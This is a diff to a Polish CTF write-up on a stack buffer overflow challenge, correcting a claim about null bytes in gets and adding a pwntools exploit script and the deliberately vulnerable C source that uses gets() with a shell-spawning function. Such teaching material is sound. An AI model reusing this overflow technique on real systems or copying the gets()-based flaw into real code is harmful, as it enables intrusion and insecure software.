@@ -70,7 +70,7 @@ Chcielibyśmy już teraz nadpisać adres powrotu ale dalsza analiza pokazuje że
 
 ![exits](img/exits.png)
 
-Tylko poprawne zakończenie (skrajnie prawy blok) algorytmu prowadzi do powrotu, w przeciwnym razie uruchamiany jest `exit` więc podmiana adresu nic nie da. Problemem jest 32-bitowa zmienna `var_4` która reprezentuje bilans nawiasów otwierających i zamykających. Żeby algorytm stwierdził że nawiasowanie jest poprawne to w szczególności na końcu musi ona wynosić 0. Nie możemy po prostu wkleić bajtów zerowych w payload bo `gets` tego nie wczyta. Trik polega na tym że oprócz nadpisania surowej wartości bilans możemy jeszcze potem zmodyfikować podając nawiasy. Plan jest prosty - ustawmy bilans na `INT_MAX` i podajmy jeden nawias, żeby przekręcił się na 0.
+Tylko poprawne zakończenie (skrajnie prawy blok) algorytmu prowadzi do powrotu, w przeciwnym razie uruchamiany jest `exit` więc podmiana adresu nic nie da. Problemem jest 32-bitowa zmienna `var_4` która reprezentuje bilans nawiasów otwierających i zamykających. Żeby algorytm stwierdził że nawiasowanie jest poprawne to w szczególności na końcu musi ona wynosić 0. ~~Nie możemy po prostu wkleić bajtów zerowych w payload bo `gets` tego nie wczyta~~ (EDIT: Jednak się myliłem, `gets` bez problemu czyta bajty zerowe. W każdym razie wersja bez bajtów zerowych jest często wymagana, więc opłaca się poćwiczyć różne sposoby). Trik polega na tym że oprócz nadpisania surowej wartości bilans możemy jeszcze potem zmodyfikować podając nawiasy. Plan jest prosty - ustawmy bilans na `INT_MAX` i podajmy jeden nawias, żeby przekręcił się na 0.
 
 Payload będzie miał następujący schemat
 ```
@@ -102,4 +102,69 @@ ls
 brackets  brackets.c  exploit.py  flag
 cat flag
 pwn{b1n4ry_expl01t1ng}
+```
+
+## BONUS 
+
+Dump reszty plików!
+
+`exploit.py`
+
+```python
+exploit = ''.join(["()" for i in range(62)])+"\x00\x00\x00\x00AAAAAAAA\xf6\x05\x40\x00"
+
+from pwn import *
+
+r = process('./brackets')
+r.recvline()
+r.sendline(exploit)
+r.interactive()
+```
+
+`brackets.c`
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+
+#define FAIL(s) printf(s), exit(1)
+
+void shell_me()
+{
+        char *filename = "/bin/sh";
+        char *argv [2] = {filename, NULL};
+        char *envp [1] = {NULL};
+        execve(filename, argv, envp);
+}
+
+void check_my_brackets()
+{
+    int level = 0;
+        char str[100];
+
+        gets(str);
+        for(char* s = str;*s;++s)
+        {
+                if(*s == '(')
+                        level++;
+                if(*s == ')')
+                {
+                        level--;
+                        if(level < 0)
+                                FAIL("Missing opening bracket!\n");
+                }
+        }
+
+        if(level)
+                FAIL("Missing closing bracket!\n");
+        return;
+}
+
+int main()
+{
+        printf("Enter expression to check:\n");
+        check_my_brackets();
+        printf("Correct!\n");
+        return 0;
+}
 ```
